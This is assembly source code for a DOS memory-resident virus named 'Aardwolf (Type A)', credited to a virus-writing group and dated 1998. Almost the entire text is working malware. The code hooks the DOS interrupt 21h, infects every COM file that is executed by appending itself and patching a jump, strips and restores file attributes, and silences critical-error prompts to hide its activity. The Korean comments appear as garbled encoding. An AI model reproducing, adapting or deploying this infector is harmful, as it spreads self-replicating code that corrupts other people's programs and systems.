;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
; Virus Name : Aardwolf (Type A)
; Author     : Crom
; Group      : CVC
; Origin     : Corea
; Date       : 1998/03/20
; Type       : Memory resident COM
;
;   !************************************************************************!
;   *                                                                        *
;   * Warning !                                                              *
;   *        This information is for educational purposes only. We are       *
;   *        not responsible for any problems caused by the use of this      *
;   *        information. Responsibility is entirely placed on the reader    *
;   *                                                                        *
;   !************************************************************************!
;
; ! Aardwolf (Type A)
;
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

	    .286
	    .MODEL  TINY
	    .CODE

            org  0h

 PARASIZE   EQU  (End_Memory - Aardwolf + 0Fh) SHR 4 + 10h

 Aardwolf:
	    call  Get_Ip
 Get_Ip:    pop   si
	    sub   si,0003		    ;

            mov   ax,0f1f1h                 ;
	    int   21h
	    cmp   ax,0f2f2h
	    jnz   Resident
                                            ;
            add   si, offset Buffer         ;
	    mov   di, 100h
	    movsw
	    movsw
	    mov   ax,100h
	    push  ax
	    ret

 Resident:
            mov   PSP1[SI], ds              ;
	    mov   PSP2[SI], ds
	    mov   PSP3[SI], ds

            mov   ax, es                    ;
	    add   ax,0010h
	    mov   es,ax
	    push  es
	    mov   ax, offset New_CS
	    push  ax

	    mov   cx, offset End_virus	    ;
	    xor   di, di
	    repz  movsb
	    retf
 New_CS:
            push  cs                        ; CS=SS
	    pop   ss
	    mov   sp, offset End_Memory     ;

            push  cs                        ; Int 21h
	    pop   ds
	    mov   ax, 3521h
	    int   21h

            mov   word ptr OldInt21,BX
            mov   word ptr OldInt21[2],ES

            mov   ax, 2521h                 ; Int 21h
	    push  cs
	    pop   es
	    mov   dx, offset NewInt21Handler
	    int   21h

	    mov   ah, 4ah		    ;
	    mov   bx, PARASIZE
            mov   es, PSP1
            int   21h

            call  Set_env                   ;

            push  cs
            pop   es

            mov   ax, 4b00h                 ;
            mov   bx, offset Env_Block
	    call  Call_Int21

	    push  ds
	    pop   es

            mov   ah, 49h                   ;
	    int   21h

            mov   ah, 31h                   ;
            mov   dx, Parasize              ;
	    int   21h

 Msg	    db	  0dh,0ah
            db    '[Aardwolf] Type.A',0dh,0ah
            db    '(c) Copyleft 1998 by Crom/CVC,Corea$'

;******************************************************************************
;	    Virus Int 21h Handler
;******************************************************************************

 NewInt21Handler:
	    pushf
	    cmp   ax, 0F1F1h		    ;
	    jnz   Check_Execute
	    mov   ax, 0F2F2h
	    popf
	    iret

 Check_Execute:
            pusha                           ;
	    push  ds
	    push  es

	    cmp   ah,4Bh		    ;
	    jz	  SetInt24
            jmp   Pop_

 SetInt24:
            push  ds
            xor   ax,ax
            mov   ds,ax

	    push  DS:[0090h]		    ; Int 24h
	    Push  DS:[0092h]

            mov   DS:[0090h],offset NewInt24; Int 24h
	    mov   DS:[0092h],cs

            pop   ds                        ;
	    mov   ax,4300h		    ; ­¢¬÷´è‹¡
	    int   21h

	    push  ds			    ; Ìa·© ·¡Ÿq
	    push  dx
	    push  cx			    ; ­¢¬÷

	    xor   cx,cx 		    ; ·ª‹¡/³a‹¡¡ ¤aŽ‘
	    mov   ax,4301h
	    int   21h
	    jnc   Open_File
	    Jmp   Open_Fail		    ; µ¡ŸA·¡¡e {‘

 Open_File:
	    mov   ax,3d02h		    ; Ìa·© µ¡Ïe
	    int   21h
	    jnc   GetDT
	    jmp   Open_Fail
 GetDT:
            xchg  ax,bx                     ; Ìa·© Ð…—i

            mov   ax,5700h                  ; ˆqµqÌa·©· i¼a/¯¡ˆe ´è‹¡
	    int   21h
	    push  cx
	    push  dx

            push  cs                        ; cs=ds
	    pop   ds
            Push  cs                        ; cs=es
            Pop   es

	    mov   ah,3Fh		    ; Ìa·© ·ª‹¡
            mov   dx,offset Buffer
            mov   cx,004h
	    int   21h

            mov   AX, word ptr Buffer       ;
            cmp   ax,'ZM'                   ; EXE Ìa·© ·¥ˆa ?
            jz    Set_Date
            cmp   byte ptr Buffer, 0E9h     ; JMP ¡ww·¥ˆa ?
            jnz   Infect_COM
            cmp   byte ptr Buffer+3, 0FFh   ; ˆqµq –A´öa ?
            jz    Set_Date
 Infect_COM:
            mov   ax,4202h                  ; Ìa·© {·a¡ ·¡•·
            xor   cx,cx
            xor   dx,dx
            int   21h

            sub   ax,0003                   ;
            mov   word ptr Jump_Code+1, ax  ;

            mov   ah, 40h                   ; ¤a·¡œá¯a ³a‹¡
            mov   cx, offset End_virus
            xor   dx, dx
            int   21h

            mov   ax, 4200h                 ; COM Àá·q·a¡ ·¡•·
            xor   cx, cx
            xor   dx, dx
            int   21h

            mov   ah, 40h                   ; ¥eÑw–E JMP ¡ww ³a‹¡
            mov   cx, 0004
            mov   dx, offset Jump_Code
            int   21h

 Set_Date:
	    pop   dx			    ; i¼a ¥¢Š
	    pop   cx
	    mov   ax,5701h		    ; i¼a/¯¡ˆe ¸÷¬w·a¡ ¥¢Š
	    int   21h
 Close_file:
	    mov   ah,3Eh		    ; Ìa·© ”h‹¡
	    int   21h
 Open_Fail:
	    mov   ax,4301h		    ; ¶¥œ ­¢¬÷ ¥eÑÅ
	    pop   cx
	    pop   dx
	    pop   ds
	    int   21h
	    xor   ax,ax 		    ; ¶¥œ Int 24h ¡ ¤aŽ‘
	    mov   ds,ax
	    pop   DS:[0092h]
	    pop   DS:[0090h]
 pop_:
            pop   es
	    pop   ds
	    popa
	    popf

 Jmp_Org_Int21:
            db    0EAh                      ;
 OldInt21   dd	  ?

 NewInt24:
            xor   al,al                     ; Int 24h Ð…—iœá
	    iret

;******************************************************************************
; ÑÅ‰wµwµbµA¬á ¸¯©Ð—µA Ï©¶aÐe ¸÷¥¡ ´è‹¡
;******************************************************************************

 Set_Env    proc  near

 Search_RD:                                 ; ¸¯©Ð—·i ¶áÐe ¸÷¥¡Ÿi ´è´á …”a.
	    xor   si,si
	    mov   ax, PSP1
	    mov   ds,ax
	    mov   ds,ds:[002Ch] 	    ; ¯©Ð—¯¡Ç¥ Ìa·©· ·¡Ÿq·i ´i´a…”a.

 Search_RD_LOOP:
	    cmp   word ptr DS:[SI],0000     ; Ìa·©·¡Ÿq¸åµA“e 0000·¡”a.
	    jz	  Get_FileName		    ; PSP:[002Ch] --> ­A‹a åËa
	    inc   si
	    jmp   Search_RD_LOOP

 Get_FileName:
	    add   si,0004
	    mov   dx,si 		    ; Ñe¸ ¯©Ð—–A“e Ìa·©·¡Ÿq
	    ret
 Set_env    endp

;
; ·¥ÈáœóËa 21h Ñ¡Â‰
;

 Call_Int21 proc  near

	    pushf
	    call  dword ptr cs:OldInt21
	    ret

 Call_Int21 endp

;
; ¸¯©Ð—·i ¶áÐe §iœâ
;

 ENV_BLOCK  dw	  ?			    ; ¸¯©Ð—¶w §iœâ
	    dw	  80h			    ;
 PSP1	    dw	  ?
	    dw	  5ch			    ;
 PSP2	    dw	  ?
	    dw	  6ch			    ;
 PSP3	    dw	  ?

 Jump_code  db    0E9h, ?, ?, 0FFh          ;
 Buffer     db    0CDh, 20h, 90h, 90h       ; ´|¦¦…

 End_Virus:

	    db	  100h dup (?)		    ; ¯aÈ‚ ¦¦…
 End_Memory:

	    END   Aardwolf

